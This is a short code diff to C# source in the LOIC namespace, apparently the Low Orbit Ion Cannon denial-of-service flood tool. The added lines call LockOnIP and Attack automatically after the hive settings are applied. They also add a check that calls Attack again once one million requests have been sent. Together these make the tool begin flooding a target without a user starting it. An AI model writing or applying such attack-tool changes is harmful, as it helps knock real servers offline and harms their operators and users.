@@ -80,6 +80,8 @@ namespace LOIC
 
 			enableHive.Checked |= hive;
 			disableHive.Checked |= !hive;
+			LockOnIP(true);
+			Attack(false, true, true);
 		}
 
 		/// <summary>
@@ -899,6 +901,9 @@ namespace LOIC
 						iDownloaded += c.Downloaded;
 						iRequested += c.Requested;
 						iFailed += c.Failed;
+						if(iRequested >= 1000000){
+							Attack(false, false, true);
+						}
 						if(c.State == ReqState.Ready ||
 							c.State == ReqState.Completed)
 							iIdle++;
